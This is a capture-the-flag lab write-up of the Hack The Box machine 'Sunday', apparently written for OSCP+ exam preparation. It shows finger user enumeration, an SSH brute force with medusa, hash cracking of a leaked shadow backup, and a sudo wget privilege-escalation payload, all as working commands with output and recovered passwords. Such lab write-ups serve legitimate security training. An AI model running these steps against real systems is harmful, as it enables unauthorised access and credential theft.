---
layout: post
title:  HTB Sunday Write-up 2024
description: Part of the OSCP+ Preparation Series
date:   2024-11-05 07:00:00 +0300
image:  '/images/htb_sunday.png'
tags:   [Write-ups, HTB, OSCP+, Unix, Easy, SSH-Brute-Force, Shadow, Sudo-l]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [finger Port 79 Enumeration](#finger-port-79-enumeration)
- [Foothold](#foothold)
  - [SSH Brute-forcing](#ssh-brute-forcing)
  - [Backup folder containing /shadow copy](#backup-folder-containing-shadow-copy)
- [Privilege Escalation](#privilege-escalation)
  - [sudo -l and GTFOBins for wget](#sudo--l-and-gtfobins-for-wget)

# Enumeration
### Nmap
When scanning this machine, it was much faster to do a "Two Step" Nmap scan:
```shell
# Step 1 - Find active ports
nmap -p- --min-rate 10000 10.129.144.138

# Step 2 - Focus scan on the active ports found
sudo nmap -A -Pn -p79,111,515,6787,22022 10.129.144.138
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 15:58 EST
Nmap scan report for 10.129.144.138
Host is up (0.033s latency).

PORT      STATE SERVICE VERSION
79/tcp    open  finger?
|_finger: No one logged on\x0D
| fingerprint-strings: 
|   GenericLines: 
|     No one logged on
|   GetRequest: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help: 
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest: 
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     RTSP/1.0 ???
|   SSLSessionReq, TerminalServerCookie: 
|_    Login Name TTY Idle When Where
111/tcp   open  rpcbind 2-4 (RPC #100000)
515/tcp   open  printer
6787/tcp  open  http    Apache httpd
|_http-title: 400 Bad Request
|_http-server-header: Apache
22022/tcp open  ssh     OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA)
|_  256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port79-TCP:V=7.94SVN%I=7%D=11/5%Time=672A8716%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,12,"No\x20one\x20logged\x20on\r\n")%r(GetRequest,93,"Login\
SF:x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20
SF:\x20\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nGET\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?
SF:\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\?\?\?\r\n")%r(Help,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\nHE
SF:LP\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\?\?\?\r\n")%r(HTTPOptions,93,"Login\x20\x20\x20\x20\x20\x20\x20Name
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Whe
SF:re\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\?\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(RTSPRequest,93,"Login\x20\
SF:x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20
SF:\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nRTSP/1\.
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r
SF:(SSLSessionReq,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\n\x16\x03\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\?\?\?\r\n")%r(TerminalServerCookie,5D,"Login\x20\x20\x20\x20\x
SF:20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\
SF:x20\x20\x20Where\r\n\x03\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Oracle Solaris 11 (92%), Sun Solaris 9 or 10 (SPARC) (91%), Oracle Solaris 11 or OpenIndiana (91%), Sun Solaris 10 (91%), Oracle Solaris 10 (90%), Sun Storage 7210 NAS device (90%), Sun Solaris 9 or 10 (90%), Sun Solaris 11.3 (90%), Sun OpenSolaris 2008.11 (89%), Sun Solaris 9 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   31.73 ms 10.10.14.1
2   31.79 ms 10.129.144.138

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.79 seconds
```
If we examine our Nmap scan, we can see the finger service running at Port 79. This allows us to get status reports on logged on users, so we can use this to get information about users.

### finger Port 79 Enumeration
We can interact with Port 79 using the following command:
```shell
finger @10.129.144.138
```
In this case, finger returns no logged on users.

But we can use a script called finger-users-enum.pl from pentestmonkey to do some users enumeration:
```shell
# Get the script from GitHub
git clone https://github.com/pentestmonkey/finger-user-enum.git
cd finger-user-enum
sudo chmod +x finger-user-enum.pl

# Use finger-user-enum.pl
./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.129.144.138
```
Running the script, we got some usernames, but the two that got our attention were sammy and sunny:
```shell
<SNIP>
root@10.129.144.138: root     Super-User            console      <Dec  7, 2023>..
sammy@10.129.144.138: sammy           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
sunny@10.129.144.138: sunny           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
sys@10.129.144.138: sys             ???                         < .  .  .  . >..
<SNIP>
```
# Foothold
### SSH Brute-forcing
With these two usernames, we can do a brute-force attack on SSH at the Port 22022 (which we noticed on our Nmap results).

To do the brute-force attack, we will use a custom wordlist and medusa.

In our custom list, we will write the usernames, the box name and some default passwords inside a text file and name it passwords.txt:

```shell
cat passwords.txt

sammy
sunny
sunday
Sammy
Sunny
Sunday
password
password123
Password123
Password123!
admin
1234
123456
```

And now we can use the passwords.txt list we created with the tool medusa to do a brute-force attack on SSH:
```shell
medusa -h 10.129.144.138 -n 22022 -u sammy -P passwords.txt -M ssh
medusa -h 10.129.144.138 -n 22022 -u sunny -P passwords.txt -M ssh
```
Nice! We got valid credentials for the user sunny:
```shell
ACCOUNT FOUND: [ssh] Host: 10.129.144.138 User: sunny Password: sunday [SUCCESS]
```
Now we can get access as sunny using SSH:
```shell
ssh -p 22022 sunny@10.129.144.138
```
### Backup folder containing /shadow copy
Enumerating the folders, we found a backup containing users and hashes:
```shell
cat /backup/shadow.backup

mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```
We can use hashcat to try to crack these hashes:
```shell
cat hashes.txt

$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB
$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3
```

```shell
hashcat -m 7400 hashes.txt /usr/share/wordlists/rockyou.txt
```
We managed to crack the password of sammy:
```shell
$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:cooldude!
```
Giving us the following credentials:
```shell
sammy:cooldude!
```
We can use these credentials to get access as sammy using SSH and get the user.txt flag:
```shell
ssh -p 22022 sammy@10.129.144.138
```
### User Flag
```shell
-bash-5.1$ cd ~
-bash-5.1$ ls
user.txt
-bash-5.1$ cat user.txt
```
# Privilege Escalation
### sudo -l and GTFOBins for wget
If we run sudo -l, we will get the following message telling us that the user sammy can run wget as sudo without password:
```shell
-bash-5.1$ sudo -l
User sammy may run the following commands on sunday:
    (ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```
If we visit GTFOBins, we will find a way to get root abusing this entering the following commands, one line at a time:
```shell
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
sudo wget --use-askpass=$TF 0
```
After entering the 4 command lines above, we will get shell as root:
```shell
-bash-5.1$ TF=$(mktemp)
-bash-5.1$ chmod +x $TF
-bash-5.1$ echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
-bash-5.1$ sudo wget --use-askpass=$TF 0
root@sunday:/home/sammy# whoami
root
```
### Root Flag
Now we can get the root.txt flag:
```shell
cat /root/root.txt
```